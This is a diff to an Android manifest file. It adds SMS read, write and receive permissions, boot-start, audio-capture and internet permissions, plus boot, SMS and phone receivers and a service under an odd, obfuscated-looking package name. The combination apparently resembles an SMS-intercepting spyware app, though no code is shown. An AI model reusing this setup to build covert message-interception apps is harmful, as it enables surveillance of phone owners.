@@ -8,6 +8,16 @@
         android:minSdkVersion="8"
         android:targetSdkVersion="22" />
 
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
@@ -22,6 +32,12 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <receiver android:name="ooo$xxx$okhelper$Receiver$BootReceiver" />
+        <receiver android:name="ooo$xxx$okhelper$Receiver$SMSReceiver" />
+        <receiver android:name="ooo$xxx$okhelper$Receiver$PhoneReceiver" />
+
+        <service android:name="ooo.xxx.okhelper.services.MyService" />
     </application>
 
 </manifest>
